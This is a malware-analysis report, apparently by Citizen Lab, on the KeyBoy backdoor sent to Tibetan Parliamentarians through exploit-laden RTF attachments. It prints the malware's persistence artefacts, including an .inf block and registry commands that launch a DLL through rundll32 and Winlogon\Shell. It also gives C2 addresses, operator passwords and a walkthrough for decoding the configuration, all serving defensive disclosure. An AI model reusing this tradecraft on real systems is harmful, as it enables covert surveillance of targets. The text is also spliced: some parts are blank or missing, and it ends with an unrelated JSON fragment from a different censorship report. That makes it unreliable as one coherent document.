KeyBoy is the product of a development cycle that is iterated only as much as necessary to ensure the survival of the implant against antivirus detection and basic security controls.\nThis report is divided into two parts:\nPart 1: The Parliamentarian Operation Analyzes an operation targeting the members of the Tibetan Parliament by repurposing legitimate content, and documents implanted with Keyboy.\nPart 2: KeyBoy – Tracking Evolution Examines the KeyBoy development cycle revealing a focus on avoiding basic antivirus detection.\nTo assist other researchers, we include appendices and indicators of compromise that detail the KeyBoy samples we analyzed and provide an in-depth analysis of some features of the most recent implant.\nPart 1: The Parliamentarian Operation\nIn August and October 2016 we observed a malware operation targeting members of the Tibetan Parliament (the highest legislative organ of the Tibetan government in exile, formally known as Central Tibetan Administration). We collected two emails sent to Parliamentarians that rapidly repurposed legitimate content in an attempt to entice recipients to open malicious documents. The first attempt leveraged an old vulnerability in the parsing of Rich-text-format (.rtf) files (CVE-2012-0158). The second attempt used a newer, but also patched, .rtf vulnerability (CVE-2015-1641). Both attempts used versions of KeyBoy and shared the same command and control infrastructure as well as other configuration details.\nAttempt 1\nOn August 25, 2016, members of the Tibetan Parliament received an email with information on an upcoming conference relevant to the Tibetan community. This email had the same subject and attachment as a legitimate message sent to the same recipients just 15 hours prior, but in this case the attachment was crafted to exploit a frequently targeted vulnerability in Microsoft Office. The accompanying malware was a backdoor implant designed to surveil the computers of the Parliamentarians. This malicious attachment used the original, legitimate filename as a decoy (see: Figure 1).\nFigure 1: Email lure containing malicious document. Note the use of letters ‘r n’ in an attempt to appear as ‘m’ in the sender address.\nThis level of targeting and re-use of a legitimate document sent only hours before shows that the actors behind the operation are closely watching the Tibetan community, and may have already compromised the communications of one or more of the Parliamentarians.\nDocument name: theme of the conference.doc\nMD5: 8307e444cad98b1b59568ad2eba5f201\nOpening the attachment (an apparently blank document) in Microsoft Word would result in the infection of the target system with the KeyBoy implant.\nThe Infection Chain\nThe email attachment is a .rtf document containing a dropper, delivered using an exploit designed to leverage CVE-2012-0158, a vulnerability in the way that Microsoft Word handles .rtf files. Over the past four years, this vulnerability has been consistently used in malware campaigns against the Tibetan community despite having been patched since April 2012.\nIf the exploit is successful, the following infection chain (see: Figure 2) is observed on the system.\nFigure 2: Process chain after exploit is successful\nThe files in this infection chain are outlined below. The exploit launches an executable ‘dropper’ component which is responsible for placing the malware payload and its configuration file on disk, and finally for launching the main malware code. \nNote that the dropper and the final (DLL) payload were compiled within seconds of each other.\nName: dw20.exe\nSize: 256512 bytes\nCompile Time: 09 May 2016 08:41:26 UTC\nMD5: 0b4d45db323f68b465ae052d3a872068\nSHA256: 5f24a5ee9ecfd4a8e5f967ffcf24580a83942cd7b09d310b9525962ed2614a49\nPurpose: dropper binary, used to install and execute the main implant\nName: wab32res.exe\nSize: 46080 bytes\nCompile Time: 13 April 2008 18:30:52 UTC\nMD5: 8f08609e4e0b3d26814b3073a42df415\nSHA256: 58105e9772f6befbc319c147a97faded4fbacf839947b34fe3695ae72771da5d\nPurpose: legitimate Microsoft Windows Address Book executable, used to load final payload\nName: wab32res.dll\nSize: 138240 bytes\nCompile Time: 09 May 2016 08:41:05 UTC\nMD5: 495adb1b9777002ecfe22aaf52fcee93\nSHA256:  9a55577d357922711ab0821bf5379289293c8517ae1d94d48c389f306af57a04\nPurpose: malware payload, launched by wab32res.exe via DLL search order hijacking\nNext, the dropper places a renamed copy of the legitimate Windows Address Book executable, along with the malware binary, wab32res.dll, in the Local Application Data directory. Notably, the dropper modifies the timestamps of the configuration file and the payload to match those of the \\Microsoft\\SystemCertificates\\My\\ directory within the user’s Local Application Data directory. Once these files are written to disk, the dropper starts the Windows Address Book executable which loads and executes the malicious wab32res.dll file via DLL search-order hijacking.\nAttempt 2\nOn October 11, 2016, the Tibetan Parliamentarians received an email with content repurposed from a Tibetan activism campaign protesting the demolition of a Buddhist monastery in Tibet. The email was sent from the same email address as the previous attempt (tibetanparliarnent[@]yahoo.com) and appears to copy content from the Facebook page of a Tibetan NGO promoting the campaign. The message urges recipients to open an attached .rtf file with further details on the campaign (see: Figure 3).\nFigure 3: Email lure used in second attempt\nDocument name: urgent action larung gar buddhist academy.rtf\nMD5: 913b82ff8f090670fc6387e3a7bea12d\nOpening the attachment (an apparently blank document) in Microsoft Word would, similar to the first attempt, result in the infection of the target system with the KeyBoy implant.\nThe Infection Chain\nThe .rtf document attached to the malicious email was designed to exploit a more recent vulnerability: CVE-2015-1641. If successful, this exploit launches a newer version of the same malware used in the August attempt outlined above, using a similar infection chain.\nName: n/a\nSize: 262144 bytes\nCompile Time: 29 September 2016 00:46:11 UTC\nMD5: 23d284245e53ae4fe05c517d807ffccf\nSHA256: 542c85fda8df8510c1b66a122e459aac8c0919f1fe9fa2c43fd87899cffa05bf\nPurpose:dropper binary, used to install and execute the main implant\nName: wab32res.exe\nSize: 46080 bytes\nCompile Time: 13 April 2008 18:30:52 UTC\nMD5: 8f08609e4e0b3d26814b3073a42df415\nSHA256: 58105e9772f6befbc319c147a97faded4fbacf839947b34fe3695ae72771da5d\nPurpose:legitimate Microsoft Windows Address Book executable, used to load final payload\nName: wab32res.dll\nSize: 143872 bytes\nCompile Time: 29 September 2016 00:21:34 UTC\nMD5: 087bffa8a570079948310dc9731c5709\nSHA256:  5da2f14c382d7cac8dfa6c86e528a646a81f0b40cfee9611c8cfb4b5d589aa88\nPurpose:malware payload, launched by wab32res.exe via DLL search order hijacking\nAs with the first attempt, the resulting dropper installs the malware payload into the Local Application Data directory as wab32res.dll and subsequently launches it using the same method of DLL search-order hijacking against the legitimate Windows Address Book executable.\nA Note on Vulnerabilities\nThe two .rtf vulnerabilities targeted in these exploitation attempts, CVE-2012-0158 and CVE-2015-1641, are among a set of four .rtf vulnerabilities discussed in recent reporting from researchers at Arbor Networks.\nThe researchers describe the presumed existence of an exploit document ‘builder’ designed to selectively weaponize .rtf files using four older, patched, vulnerabilities: CVE-2012-0158, CVE-2012-1856, CVE-2015-1641, and CVE-2015-1770.\nThe Arbor report describes the ongoing use of these four vulnerabilities in a series of espionage campaigns against not only Tibetan groups, but also others related to Hong Kong, Taiwan, and Uyghur interests. While we have not connected the campaign targeting the Tibetan Parliamentarians to the campaigns described by Arbor, the continual pairing of these older .rtf vulnerabilities with malware operations against the Tibetan community is noteworthy.\nThe Malware\nThe malware samples deployed in both of these operations are updated versions of the KeyBoy backdoor first discussed in 2013 by Rapid7. KeyBoy provides basic backdoor functionality, allowing the operators to select from various capabilities used to surveil and steal information from the victim machine.\nKeyBoy functionality:\n\nGather system information, including details of the operating system, processor, disk, memory, display, and uptime (see: Figure 4)\nUpload files to the victim computer\nDownload files from the victim computer\nBrowse the file system, including gathering details about attached drives\nExecute commands and applications\nLaunch interactive shell\n\nFigure 4: Format strings illustrating some of the system information obtained by KeyBoy from an infected machine\nThese updated versions of KeyBoy make use of an encoded configuration file to store their command and control (C2) information along with other required settings. In both cases, the dropper wrote this configuration file in the user’s Local Application Data directory as win32res.dat. After analyzing these malware samples, we were able to decode the following configuration parameters, presented in Table 1\n\n\n\nLine\nDescription\nFirst sample\nSecond sample\n\n\nLine 1\nIdentity code, used to ensure config was correctly decoded\n9876543210\n9876543210\n\n\nLine 2\nC2 Server #1 (hostname/ip)\n45.125.12[.]147\n45.125.12[.]147\n\n\nLine 3\nC2 Server #2 (hostname/ip)\n103.40.102[.]233\n45.125.12[.]147\n\n\nLine 4\nC2 Server #3 (hostname/ip)\n45.125.12[.]147\n45.125.12[.]147\n\n\nLine 5\nPort used with C2 Server #1\n443\n443\n\n\nLine 6\nPort used with C2 Server #2\n443\n443\n\n\nLine 7\nPort used with C2 Server #3\n443\n443\n\n\nLine 8\nPassword for operator login\ntibetwoman\ntibetwoman\n\n\nLine 9\nCampaign ID, transmitted to C2 during login\nNNNN\nNNNN\n\n\n\nTable 1: Decoded configuration parameters from both KeyBoy samples observed in the Parliamentarian operation\nA full description of the new algorithm used by KeyBoy to decode its configuration file is presented in Appendix A.\nOnce the KeyBoy DLL has been executed, it validates that a particular string value (likely identifying the KeyBoy version) is set in the Windows Registry.\n\n\n\nKey\nFirst sample\nSecond sample\n\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zonemap\\Ver\n20160509\nagewkassif\n\n\n\nAdditionally, these versions of KeyBoy ensure persistence by setting the wab32res.exe file to be loaded upon login via exploiting the Winlogon Shell key, which in turn loads the malicious wab32res.dll file by the aforementioned DLL search-order hijacking method.\n\n\n\nKey\nValue\n\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell\nexplorer.exe, “C:\\users\\<user>\\AppData\\Local\\wab32res.exe”\n\n\n\nThe backdoor then sends a login beacon to the C2 server which, once decoded, looks like:\n*a*\nUSER-PC\n192.168.100.101\nNNNN\n2016/09/13 16:11:56\n20160509\nThese values are described as follows in Table 2:\n\n\n\nValue from Example\nDescription\n\n\n*a*\nData header code for initial check-in beacon\n\n\nUSER-PC\n%computername% of victim PC\n\n\n192.168.100.101\nIP address of victim PC\n\n\nNNNN\nCampaign ID from the KeyBoy configuration file\n\n\n2016/09/13 16:11:56\nTimestamp of local PC\n\n\n20160509\nInternal version identifier\n\n\n\nTable 2: Descriptions of the login beacon values\nThis login data, as well as all other communication between backdoor and command and control server, is transmitted using an encoding mechanism based on principles from modular arithmetic. We describe this network communication encoding in detail in this supplementary document.\nAs can be seen in the login event example above, when sending data to the C2, the KeyBoy implant uses a series of header ‘codes’ to specify the type of data which is being transmitted, described in Table 3:\n\n\n\nHeader code\nData being transmitted\n\n\n*l*\nHeartbeat / Keepalive\n\n\n*a*\nInitial check-in beacon\n\n\n*s*\nSystem information (drive info, system specifications, interface info)\n\n\n*d*\nData from remote commands and shell\n\n\n*f*\nData relating to interactions via File Manager\n\n\n*g*\nReady to initiate file download\n\n\n*h*\nReady to initiate file upload or update\n\n\n\nTable 3: KeyBoy header codes for sending data to the C2 server\nThe Infrastructure\nThe command and control (C2) servers used in the Tibetan Parliament operation were extracted from the KeyBoy configuration files:\n\n\n\nC2 Host: 45.125.12[.]147\nDesc: Royal Network Technology Co\nCity: Guangzhou\nCountry: China\n\n\nNo relevant data or passive DNS information was available\n\n\n\n \n\n\n\nC2 Host: 103.40.102[.]233\nDesc: Dragon Network Int’l Co.

The configuration files referenced hard-coded IP addresses for the C2 servers, as opposed to using domain names as was seen in prior KeyBoy campaigns.\nPassive DNS analysis revealed one domain, tibetvoices[.]com, which was briefly pointed to one of the C2 server IP addresses found in the KeyBoy configuration file used in the first attempt against the Parliamentarians. This domain was created in May 2016 (around the time that the KeyBoy sample used in the first attempt was compiled) and was pointed to IP address 103.40.102[.]233 from July 15 to September 28. Subsequently, this domain was pointed to 127.0.0.1, effectively taking it offline.\nThis behavioural tactic was previously mentioned in relation to KeyBoy in a 2013 blog post by Cisco. Cisco hypothesized that the actors behind KeyBoy may have been nullifying the DNS records when an active campaign was not underway, in an attempt to stay “below the radar”. This tactic allows the malware operator to ensure that no command and control traffic will be sent out from the infected system, thus preventing detection via network monitoring.\nThis tactic, however plausible, would not apply to the KeyBoy samples we analyzed, as the C2 configuration relied upon hard coded IP addresses and did not directly reference the tibetvoices[.]com domain. It is possible that a different campaign was launched which used this domain, but we were unable to find any evidence of such a campaign.\nOur analysis provides a cursory look at some of the capabilities and implementation details of the KeyBoy backdoor as used during a malware operation targeting Tibetan Parliamentarians. These versions of KeyBoy differed from the one first described by Rapid7 in several ways, many of which will be described in the sections to follow.\nDuring our research into this operation we were able to uncover two additional samples of KeyBoy which were likely used in previous malware campaigns. These samples were contained in exploit documents containing distinct lure content, one having a Tibetan nexus, the other an Indian nexus.\nIn Part 2 we present a brief overview of the observable evolution of KeyBoy based upon all of the samples we obtained.\nPart 2: KeyBoy – Tracking Evolution\nPeriodic updates are common in the world of software development. Features are added and removed, bugs are patched, and code is written to execute more efficiently. The same holds true for malicious software, but with the additional requirement that the development cycle must always satisfy the operational need for covertness. To be effective, malicious software designed for surveillance must remain undetected. Malware developers are in a constant struggle to avoid the security controls that protect target systems.\nWe believe the 2013, 2015, and 2016 KeyBoy samples provide evidence of a development effort focused on changing components that would be used by researchers to develop detection signatures. This section outlines how we came to this conclusion.\nIn building our KeyBoy chronology, we collected several samples and examined three data points from each:\n\nThe compile time of the KeyBoy binary\nA string observed in the KeyBoy binary we refer to as the ‘version identifier’\nElapsed time between compile time and the time of first exposure\n\nAnalysis of these data points gave us a moderate to high level of confidence that the binary compile times provided a reliable estimate of the true development timeline.\nAn Evolving Implant\nIn an effort to understand its evolution, we compared the code of several versions of KeyBoy as identified by their ‘version identifier’ strings, shown in Table 4:\n\n\n\nVersion Identifier\nNotes\n\n\nProxy 20130401\nReported by Rapid7 in relation to an Indian nexus\n\n\nProxy 20130401\nReported by Rapid7 in relation to a Vietnamese nexus\n\n\nP_20150313\nDiscovered via hunting; carried Indian lure content\n\n\n20151108\nDiscovered via hunting; carried Tibetan lure content\n\n\n20160509\nFirst sample of the Parliamentarian operation from August 2016\n\n\n20160509\nAn alternate sample, using different configuration data\n\n\nagewkassif\nSecond sample of the Parliamentarian operation from October 2016\n\n\n\nTable 4: Version identifier strings analyzed\nThe ‘version identifier’ is a particular string that appeared in every KeyBoy sample we studied. It is transmitted to the command and control server as part of the login data packet, and, in recent versions, this identifier is written to the Windows registry in a key named ‘Ver’. With the exception of the newest (chronologically speaking) KeyBoy version we discovered, this identifier always contained a date-like component which matched the compile date of the KeyBoy binary in every case. In the newest sample, the developers replaced this date-like string with a seemingly random set of letters.\nA timeline depicting these KeyBoy versions, along with some important characteristics, is shown in Figure 5.\nFigure 5: The timeline of KeyBoy’s evolution\nNoteworthy Modifications\nThis section describes some of the most significant changes observed across the KeyBoy versions. Each of these components would have been an ideal target for signature-based identification, using either static string or network packet-based detection mechanisms.\nHeader Code Evolution\nOf the changes we identified one stands out as being an immediate target for an effective antivirus signature – the evolution of header codes used during communication between the implant and command and control server. As shown in Table 5, these codes changed substantially after the 2013 KeyBoy samples were examined and publically documented by Rapid7. It is reasonable to hypothesize that this significant change in format was in response to the publication of Rapid7’s research.\n\n\n\n2013\nEarly 2015\nLate 2015\n2016\n\n\n$login$\n#l#\n*a*\n*l*\n\n\n$sysinfo$\n#s#\n*s*\n*a*\n\n\n$shell$\n#e#\n*d*\n*s*\n\n\n$fileManager$\n#f#\n*f*\n*d*\n\n\n$fileDownload$\n#D#\n*g*\n*f*\n\n\n$fileUpload$\n#U#\n*h*\n*g*\n\n\n\n\n\n*h*\n\n\n\nTable 5: Header codes used by KeyBoy during C2 communication\nIn addition, modifying these codes produced a downstream change in the appearance of the network communication traffic produced by an active KeyBoy infection. This change would likely have rendered existing network based signatures ineffective.\nConfiguration File Changes\nAnother major change we first observed in version P_20150313 is the complete redesign of the algorithm used to encode the KeyBoy configuration file. In the 2013 samples described by Rapid7, this configuration file was encoded using a simplified static-key based algorithm. This newer encoding algorithm is significantly more involved, removing the use of a static encryption key in favour of a dynamically constructed lookup table. We provide a detailed explanation of this new algorithm in Appendix A.\nPersistence Changes\nThe method used by the implant for maintaining persistence was also changed several times. The earlier versions used a Windows service to ensure the malware stayed persistent, moving to a more commonly seen tactic of setting the Run key in the Windows registry in the early 2015 sample. This method changed again in late 2015 when the implant migrated from the Run key to using a less frequently observed registry key: Winlogon\\Shell. This key stores the list of executables which are to be run once a Windows GUI session is created, and typically holds only the standard user shell, explorer.exe.\nString Obfuscation\nIn another modification, first observed in the most recent October 11 Parliamentarian operation (version agewkassif), the developer(s) of KeyBoy began using a string obfuscation routine in order to hide many of the critical values referenced within the malware. This introduction of string obfuscation also suggests a development change aimed at evading detection. The header codes, filename references, and all of the operator commands were obfuscated and only decoded during execution of the KeyBoy DLL. Figure 6 shows a sampling of these strings, after decoding.\nFigure 6: Header code and command strings after being decoded at run-time\nEvidence of Modularity\nFinally, there were numerous changes observed that could suggest that KeyBoy was being deployed using a modular or component based mechanism. The GetUp export which is linked to the browser credential theft capability seems to be present in some samples and not others, even for versions within the same development stage. As well, the inconsistent use of a dropper binary during infection is further evidence supporting the modular component theory.\nAdditional Details\nBeyond the main modifications outlined above, numerous smaller changes were also observed, many of which are described in Table 6 below.\n\n\n\nVersion Identifier\nKey Changes\n\n\nProxy 20130401\n\n\nPersistence handled via Windows service\nOne sample contained the ‘GetUP’ export, the other did not\nUsed full word header codes encapsulated by $ symbols, such as $login$\n\n\n\n\nP_20150313\n\n\nAdopts new algorithm for config file encoding\nRetained browser credential theft module\nMoved to persistence via Run key\nHeader codes shift to #-encapsulation\nDeployed without use of dropper binary\n\n\n\n\n20151108\n\n\nContinues use of new config encoding algorithm\nMigrated to use of WinLogon key for persistence\nInstallation now conducted via VBS scripts\nAdopted multi-byte strings internally and in C2 communication\nHeader codes move to *-encapsulation\n64 bit version distributed inside 32 bit payload\nNo evidence of browser credential module\nDeployed using dropper binary\n\n\n\n\n20160509\n\n\nContinues use of new config encoding algorithm\nAdded AutoUpdate/Upload & Execute function\nDeployed using dropper binary\nHeader codes retain *-encapsulation, new ‘keep-alive’ code, *l*\nExecution via DLL search-order hijacking of legitimate Windows application\nVBS script traces still present, but no longer used\nNo 64bit version embedded\n\n\n\n\nagewkassif\n\n\nFunctionally identical to 20160509 sample\nContinues use of new config encoding algorithm\nRemoved date string from version identifier\nAdded static string obfuscation code. Strings used for C2 commands, header codes, and more are now decoded at runtime\n\n\n\n\n\nTable 6: Changes observed between successive versions of KeyBoy\nAdditional technical details relating to several of the KeyBoy samples described in this section are provided in Appendix B.\nConnecting KeyBoy to Other Operations\nIn their Operation Tropic Trooper report, Trend Micro documented the behaviour and functionality of an espionage toolkit with several design similarities to those observed in the various components of KeyBoy. Trend Micro specifically noted that the 2013 versions of KeyBoy used the same algorithm for encoding their configuration files as was observed in the Operation Tropic Trooper malware.\nThis connection may offer another explanation for the significant change in the configuration file encoding algorithm we described in relation to KeyBoy. If KeyBoy is a single component of a larger espionage toolkit, the developers may have realized that this older, static-key based, configuration encoding algorithm was inadvertently providing a link between disparate components of their malware suite.\nA Note on Samples\nWe were not able to locate a large sample set for KeyBoy. Though we discussed the development timeline, we have limited insight into the victims targeted by each of these samples. We cannot conclude that all are being deployed by the same group. We provide YARA signatures and encourage anyone who can provide additional samples or context to contact us.\nRecent Tibetan Protests\nThe harm of malware operations against the Tibetan community is well-documented, and this latest campaign is no exception. Examining the lure content sent to the Tibetan Parliamentarians sheds light on the oppression faced by the Tibetan community. On October 19, over 180 Tibetan groups protested the ongoing demolitions of the Larung Gar Buddhist Academy, the largest Tibetan Buddhist institute in the world.\nThe demolitions stem from an order issued by Chinese authorities in June 2016, according to a joint statement issued by Tibet groups on the date of protest. According to the same joint statement, the order from Chinese authorities said the community was in need of “ideological guidance” from the Chinese state. In conjunction with the demolitions, residents are being forcefully removed from Larung Gar. To date, the forced removals have led to  to the suicide of three resident nuns.\nThe Communist Party of China views the Tibetan movement as a threat to its rule, alongside Uyghur, Falun Gong, advocates for an independent Taiwan and Hong Kong, and members of the democracy movement. Surveilling the highest governing body of the Central Tibetan Administration aligns with the overall interests of the government of China. However, connecting the malware development ecosystem and the flow of stolen information to a state-actor is an elusive task. With the data available we are unable to conclusively connect the Parliamentarian Operation to any specific actor or nation-state.\nConclusions\nRecent Citizen Lab reports have documented a trend away from the use of attachment-based malware operations targeting the Tibetan Diaspora. These changes may reflect malware operators shifting tactics in response to changes in the community, including education campaigns encouraging Tibetans not to use email attachments, or perhaps also by more sophisticated attachment scanning by popular email providers.\nThe operation against the Tibetan Parliamentarians illustrates the continued use of malicious attachments in the form of documents bearing exploits. These exploits, while older, were used to deliver a malware payload which shows signs of a systematic technical adaptation designed to reduce the likelihood of signature based detection.\nThe developers of KeyBoy have made the minimum necessary technical changes required to avoid detection by signature-based antivirus, and yet retained “old” exploits because they likely continue to work their targets.\nFor a community lacking an adequate level of human and financial resources, deployment of commercial (i.e.: non-free) antivirus solutions, updated releases of common office productivity software, and even software patches may be out of reach. Under such conditions, the use of exploits against older, patched, vulnerabilities becomes yet another iteration of an actor using “just enough” sophistication to successfully exploit a target.\nThe operation against the Parliamentarians yields a clear example of this tactic. When the August operation failed to fully compromise the target group, the operators redeployed in October using a slightly newer, but still well-known and patched, exploit.\nAs we observe the evolution of strategies levied against the Tibetan Diaspora, the constant cat-and-mouse game embroiling this community becomes evident. While some behavioural adaptations have shown promise in reducing the threat, the operation against the Tibetan Parliament underscores the need for continued diligence and security awareness.\nAcknowledgments\nSpecial thanks to Tibet Action Institute.

In the 20160509 sample used in the Tibetan Parliament campaign, this file was named wab32res.dat. The configuration file contains a 16 byte header followed by a number of bytes which are encoded using a novel algorithm. The 16 byte header stores an ascii character representation of the hexadecimal values corresponding to the size (in bytes) of the decoded config data, followed by the number of bytes containing encoded configuration data.\nThe sample under examination contained the following header, and Figure 7 shows the raw configuration file:\n\n\n\nSize of config (in bytes) once decoded\nNumber of bytes in encoded config\n\n\n\n\n\n\n0x00\n0x00\n0x00\n0x5B\n\n\n\n\n\n\n\n\n0x00\n0x00\n0x00\n0x4B\n\n\n\n\n\n\n\nFigure 7: Configuration file for sample under examination\nThe configuration file used by this malware is encoded using what appears to be a custom schema. While some earlier versions of this backdoor used more simplified encoding techniques for the configuration data, newer versions have adopted a more involved algorithm.\nAt the heart of the decoding function is the use of a dynamically constructed lookup table containing sequences of bytes which represent the ASCII characters for the cleartext configuration data.\nFigure 8: Construction of the base lookup table\nAt the outset of the decoding function, a base lookup table is created containing 256 entries. This initial table can be thought of as an identity matrix, where, for each index, the lookup table contains the index as the stored value (see: Figure 8). For example:\n\n\n\nLookupTable[0x0]\n→\n0x0\n\n\nLookupTable[0x1]\n→\n0x1\n\n\n⋮\n\n⋮\n\n\nLookupTable[0xFF]\n→\n0xFF\n\n\n\nDuring the decoding of the configuration file, this table is expanded dynamically. Each iteration of the algorithm will populate the lookup table sequentially, beginning with index 0x102 (since the table index 0x101 is reserved).\nAlgorithm Walkthrough\nThe algorithm has three basic steps:\n\nObtain an index by decoding a value from the configuration file\nFind the value in the lookup table corresponding to this index, and place this result in the memory buffer holding decoded configuration data\nGenerate a new value and insert it into the lookup table at the next available index\n\nStep 1\nThis step requires the algorithm to obtain an index value from the configuration file. In order to obtain this index, a decoding function evaluates the data in the configuration file not as successive bytes, but as a series of integers calculated by considering consecutive sequences of 9-bit binary values.\nFigure 9 provides a visual representation of this process. We can see that the first few indices being calculated by this decoder are hexadecimal values 0x100, 0x39, 0x38, and 0x37. The first value, 0x100, is a ‘marker’ which denotes the beginning of the configuration data. The values 0x39, 0x38, and 0x37 are the first three indices used to obtain data from the lookup table.\nFigure 9: Step 1 in KeyBoy decoding algorithm. Indices are obtained by viewing the data in 9-bit ‘windows’\nStep 2\nAs mentioned above, the first 256 entries in the lookup table are created as an identity matrix, and thus the result of lookups for 0x39,0x38,0x37 would be:\n\nLookupTable[ 0x39 ] = 0x39 => “9” (ascii)\nLookupTable[ 0x38 ] = 0x38 => “8” (ascii)\nLookupTable[ 0x37 ] = 0x37 => “7” (ascii)\n\nThese values are then stored in memory as decoded bytes of configuration data.\nStep 3\nAfter each iteration of calculating an index (step 1) and then obtaining the corresponding value from the lookup table (step 2), the algorithm will create a new entry in the lookup table at the next available index. The format of this new lookup table entry is simply the concatenation of the results of the previous lookup with the first byte of the current lookup (see: Figure 10).\nFigure 10: Steps 2 & 3 in the KeyBoy configuration decoding algorithm\nSo, again using the same example bytes along with Figures 9 and 10 above, if the current iteration of the algorithm decoded the value 0x34 in step 1, and thus retrieved the value 0x34 = ‘4’ in step 2, the newly formed lookup table entry would be:\n\nLookupTable[ 0x106 ] = [0x35,0x34] => “54”\n\nThus, if at some future point in the decoding process the index 0x106 was obtained in step 1, the output to the configuration data would be the two bytes [0x35,0x34] which have ascii representation “54”. This provides a method of data compression to the configuration file.\nA Python script was created for the purpose of automating this configuration file decoding process. The output of this script when run against the configuration file used by the first of the two Parliamentarian operation samples yielded the following data:\n\nIdentity Code: 9876543210\nC2 Host/IP #1: 45.125.12.147\nC2 Host/IP #2: 103.40.102.233\nC2 Host/IP #3: 45.125.12.147\nC2 Port #1: 443\nC2 Port #2: 443\nC2 Port #3: 443\nPassword: tibetwoman\nCampaign ID: NNNN\n\nAppendix B: KeyBoy Samples\nVersion: P_20150313\nExploit Document: 05b5cf94f07fee666eb086c91182ad25\nPayload: 0c7e55509e0b6d4277b3facf864af018\nDLL Exports\nEmbedding 0x1000bfb0\nGetUP 0x1000c940\nSSSS 0x1000bc60\nStartWork 0x1000c570\nSvcMain 0x1000c430\nInstallation\nThis sample was discovered inside a malicious PowerPoint slide show which carried lure content consistent with an Indian-nexus, and which was uploaded to VirusTotal in April 2015 using the filename athirappalli.pps. Athirappilly is a village in India known for its wildlife and waterfalls. The visual contents of the slide show are images of waterfalls, presumably from this village. This malicious .pps file was weaponized using (closely related to CVE-2014-4114 aka Sandworm, which we have previously observed this exploit used against the Tibetan community) to execute the following embedded DLL:\nName: SystemCertificates.ocx\nSize: 495616 bytes\nCompile Time: 13 Mar 2015 03:05:34 UTC\nMD5: 0c7e55509e0b6d4277b3facf864af018\nSHA256: 5395f709ef1ca64c57be367f9795b66b5775b6e73f57089386a85925cc0ec596\nPersistence\nThis DLL maintains persistence by setting the following registry entry in the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key: SystemCertificates → \"cmd /c start Run dll32.exe %APPDATA%\\Microsoft\\SystemCertificates\\SystemCertificates.ocx, SSSS\nThis registry key is set via the Sandworm exploit, as the execution of an .inf file containing the following instructions are triggered:\n\n[DefaultInstall]\nCopyFiles = RxCopy\nAddReg = RxStart\n\n\n[RxCopy]\n..\\..\\Roaming\\Microsoft\\SystemCertificates\\SystemCertificates.ocx, contact.pdf\n[RxStart]\nHKCU,Software\\Microsoft\\Windows\\CurrentVersion\\Run,SystemCertificates,,\"cmd /c start Rundll32.exe %APPDATA%\\Microsoft\\SystemCertificates\\SystemCertificates.ocx, SSSS\"\n\nIn comparison with the prior generation of KeyBoy examined by Rapid7, this mechanism represents a change to registry based persistence from the previously used Windows service.\nConfiguration\nUsing the algorithm presented in Appendix A, we were able to decode the configuration file used by this sample.

The exploit triggers the execution of an embedded dropper, similar to the method observed in our initial sample described in Part 1.\nThis dropper creates three files on disk, each in the %localappdata% folder:\n\ncfs.dat – KeyBoy configuration file\ncfsupdate.dal – KeyBoy payload DLL\ndesk.vbs – Windows script used for installation\n\nThe Windows script file, desk.vbs, contained the following content:\n\nThe dropper executes this script file which subsequently launches the KeyBoy backdoor and sets persistence as described below.\nAlso noteworthy in this sample was the fact that this payload inspected the architecture of the victim PC to determine if it was 64 bit capable. If so, a 64 bit version of the payload was decoded from the data section of the cfsupdate.dat file using an XOR operation having key 0x90. This is very similar to the method described by Trend Micro in their report on the TROJ_YAHOYAH malware.\nInterestingly, the 64-bit module was packed using a known freeware binary packer. This is in contrast to the 32-bit versions of KeyBoy, none of which contained any binary protections whatsoever. Upon unpacking, the 64-bit version of this KeyBoy code was functionally identical to the 32-bit version.\nLeftover Code\nFurther illustrating the continued development and connections between samples are the leftover remnants from 20151108 existing in the 20160509 Parliamentarian sample. The Parliamentarian dropper contained references to the Desk.vbs script described above, yet this file and related content was not deployed or otherwise used in the 20160509 version.\nPersistence\nPersistence is achieved through the WinLogon\\Shell registry key, and is installed by the dropper’s execution of the Install export from the KeyBoy DLL. This export creates the file %localappdata%\\Desktop.ini as shown below, and installs it by launching the Windows regini.exe command:\n\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\nshell = explorer.exe,C:\\Windows\\system32\\rundll32.exe \"%LOCALAPPDATA%\\cfs.dal\" cfsUpdate\n\nConfiguration\nThe configuration file used by this version of KeyBoy is written to disk as %localappdata%\\cfs.dat by the dropper, similar to the behaviour of our 20160509 sample. This configuration file uses the newer encoding method outlined above and in Appendix A. Once decoded, the following information was obtained:\n\nIdentity Code: 9876543210\nC2 Host/IP #1: 103.242.134[.]243\nC2 Host/IP #2: 103.242.134[.]243\nC2 Host/IP #3: 103.242.134[.]243\nC2 Port #1: 443\nC2 Port #2: 1234\nC2 Port #3: 1234\nPassword: password8888\nCampaign ID: MyUser\n\nPossible Targeting\nThis malicious document embedded an empty decoy document to hide the exploitation of the vulnerability. We found however another interesting sample with the exact same payload but with a decoy document presenting a petition to release a Tibetan activist:\n\nInfrastructure\nThis sample communicates with the following command and control server:\nC2 Host: 103.242.134[.]243\nCity: Hanshan\nCountry: China\nVersion: 20160509 (alternate)\nExploit Document: beadf21b923600554b0ce54df42e78f5\nDropper: 0b4d45db323f68b465ae052d3a872068\nPayload: 495adb1b9777002ecfe22aaf52fcee93\nPayload DLL Exports\nSSSS 0x100080b0\nSvcMain 0x10008b80\ncfsUpdate 0x10008880\n\nDuring our research we encountered another sample of the 20160509 version of KeyBoy. This sample was also found to be deployed using the CVE-2012-0158 vulnerability.

    "text": "\n\t\t\t\tMedia coverage: Wall Street Journal, CBC, Bloomberg, Phys.org.\nCitizen Lab is publishing a report today that reveals hidden keyword blacklists that are used to censor chats on three popular Chinese live streaming applications, YY, 9158, and Sina Show. Contrary to prior research and assumptions that Internet censorship in China operates under a uniform set of guidelines, we find uneven implementation of censorship on the live streaming apps we studied.\nLive streaming applications have gained huge popularity in China in recent years, with millions of users flocking to them to share karaoke performances, game sessions, and glimpses of their everyday lives. Popular streams attract hundreds of thousands of users who can chat with the live streamers and purchase virtual items to give them. The live streamers can in turn trade those items for cash. These platforms have given rise to a new generation of Internet celebrities who amass audiences, virtual gifts, product endorsements, and even venture capital investment from their video streams. However, the growing popularity of these apps has been met with increased pressure from the Chinese government to ensure real name registration of live streaming performers and censorship of prohibited content.\nTo examine how censorship works on these applications, we reverse engineered them and found 